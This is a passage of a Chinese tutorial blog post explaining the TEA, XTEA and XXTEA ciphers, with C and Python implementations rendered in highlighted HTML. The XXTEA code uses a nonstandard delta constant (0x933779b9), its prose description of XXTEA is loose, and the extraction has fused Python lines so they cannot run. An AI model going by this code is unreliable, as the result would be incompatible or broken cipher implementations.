class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">+</span>sum1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        sum1<span class="token punctuation">.</span>value<span class="token operator">-=</span>delta    <span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span>v1<span class="token punctuation">.</span>value<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>    k<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密前的数据"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>    res<span class="token operator">=</span>encrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span>    res<span class="token operator">=</span>decrypt<span class="token punctuation">(</span>res<span class="token punctuation">,</span>k<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后的数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="xtea加密"><a class="markdownIt-Anchor" href="#xtea加密"></a> XTEA加密</h1><h2 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2"></a> 介绍</h2><p>XTEA是TEA的升级版：</p><p>增加了更多的密钥表，移位和异或操作等等</p><p>增加了爆破key的难度，但是加密解密的逻辑还是一样的</p><p>下图为流程图</p><p>25797</p><h2 id="实现-2"><a class="markdownIt-Anchor" href="#实现-2"></a> 实现</h2><p>C语言版</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span> <span class="token keyword">void</span> <span class="token function">encipher</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>delta<span class="token operator">=</span><span class="token number">0x9E3779B9</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>num_rounds<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>v0<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v1<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum<span class="token operator">+</span>key<span class="token punctuation">[</span>sum<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sum<span class="token operator">+=</span>delta<span class="token punctuation">;</span>v1<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v0<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum<span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>delta<span class="token operator">=</span><span class="token number">0x9E3779B9</span><span class="token punctuation">,</span>sum<span class="token operator">=</span>delta<span class="token operator">*</span>num_rounds<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>num_rounds<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>v1<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v0<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum<span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sum<span class="token operator">-=</span>delta<span class="token punctuation">;</span>v0<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v1<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum<span class="token operator">+</span>key<span class="token punctuation">[</span>sum<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint32_t</span> <span class="token keyword">const</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">;</span><span class="token comment">//这里是加密轮数，自己设置 </span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">encipher</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后原始数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">decipher</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后原始数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python版</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>v0<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>v1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>v0<span class="token punctuation">.</span>value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+</span>k<span class="token punctuation">[</span>sum1<span class="token punctuation">.</span>value<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+=</span>deltav1<span class="token punctuation">.</span>value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v0<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span>v1<span class="token punctuation">.</span>value <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>v0<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>v1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span>sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>delta<span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>v1<span class="token punctuation">.</span>value<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v0<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sum1<span class="token punctuation">.</span>value<span class="token operator">-=</span>deltav0<span class="token punctuation">.</span>value<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+</span>k<span class="token punctuation">[</span>sum1<span class="token punctuation">.</span>value<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span>v1<span class="token punctuation">.</span>value <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>k<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密前数据:"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>res<span class="token operator">=</span>encrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span>res<span class="token operator">=</span>decrypt<span class="token punctuation">(</span>res<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="xxtea"><a class="markdownIt-Anchor" href="#xxtea"></a> XXTEA</h1><h2 id="介绍-3"><a class="markdownIt-Anchor" href="#介绍-3"></a> 介绍</h2><p>XXTEA算法介绍：</p><p>XXTEA，又称Corrected Block TEA，是XTEA的升级版 ，设计者是Roger Needham, David Wheeler。</p><p>XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。</p><p>算法流程如下</p><ol><li><strong>输入和密钥设置</strong>：<ul><li>输入数据被分成32位无符号整数的块。</li><li>密钥通常由4个32位无符号整数组成。</li><li>数据块和密钥的选择取决于应用的具体需求。</li></ul></li><li><strong>轮迭代</strong>：<ul><li>XXTEA算法的加密和解密都采用迭代的方式，通常是32轮。</li><li>迭代中的基本操作是对两个32位无符号整数进行加密或解密。</li></ul></li><li><strong>加密过程</strong>：<ul><li>对每一轮的迭代，先将待加密数据分成两个32位部分（通常称为v0和v1）。</li><li>使用轮密钥对数据进行操作。密钥也分为两个32位部分，通常称为k0和k1。</li><li>执行一系列位运算和加法运算，包括左移、右移、异或等。</li><li>对每轮迭代的结果进行累加。</li></ul></li><li><strong>解密过程</strong>：<ul><li>解密过程与加密过程相反，同样进行32轮迭代。</li><li>对每一轮的迭代，使用轮密钥进行操作，执行一系列位运算和减法运算。</li><li>对每轮迭代的结果进行累减。</li></ul></li><li><strong>最后的结果</strong>：<ul><li>经过32轮迭代后，得到加密或解密后的数据块。</li></ul></li></ol><p>图解为</p><p>51260</p><h2 id="实现-3"><a class="markdownIt-Anchor" href="#实现-3"></a> 实现</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x933779b9</span> </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span><span class="token operator">^</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">//MX是一个混淆运算宏</span><span class="token keyword">void</span> <span class="token function">btea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span>z<span class="token punctuation">,</span>sum<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span>rounds<span class="token punctuation">,</span>e<span class="token punctuation">;</span>    <span class="token comment">//加密算法</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        rounds<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span> <span class="token comment">//这个可以说是预定义值，n=2是rounds=32,n</span>        sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">//n是多少就把密文分为n部分</span>        z<span class="token operator">=</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">//z是待处理数据块的最后一个32位部分</span>        <span class="token keyword">do</span><span class="token punctuation">&#123;</span>            sum<span class="token operator">+=</span>DELTA<span class="token punctuation">;</span>            e<span class="token operator">=</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">;</span>  <span class="token comment">//e用于计算每轮的轮密钥</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>p<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>p<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                y<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                z<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token operator">+=</span>MX<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            y<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            z<span class="token operator">=</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+=</span>MX<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//解密算法</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        n<span class="token operator">=</span><span class="token operator">-</span>n<span class="token punctuation">;</span>        rounds<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>        sum<span class="token operator">=</span>rounds<span class="token operator">*</span>DELTA<span class="token punctuation">;</span>        y<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>            e<span class="token operator">=</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>p<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>p<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                z<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                y<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token operator">-=</span>MX<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            z<span class="token operator">=</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            y<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-=</span>MX<span class="token punctuation">;</span>            sum<span class="token operator">-=</span>DELTA<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//密文</span>    <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>n<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span><span class="token operator">-</span>n<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 